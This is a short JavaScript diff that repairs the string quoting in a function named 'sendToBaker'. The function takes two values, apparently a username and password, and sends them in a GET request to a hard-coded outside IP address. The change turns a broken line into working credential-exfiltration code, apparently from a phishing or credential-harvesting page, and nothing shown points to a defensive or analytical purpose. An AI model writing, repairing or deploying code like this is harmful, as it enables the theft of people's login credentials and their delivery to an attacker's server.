@@ -15,7 +15,7 @@ function handler() {
 function sendToBaker(u,p){
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = handler; 
- xhr.open("GET", 'https://67.208.216.106/TESTTEST?u='+encodeURIComponent(u)+"&"p="+encodeURIComponent(p), true);
+ xhr.open("GET", 'https://67.208.216.106/TESTTEST?u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p), true);
  xhr.send();
 
 }
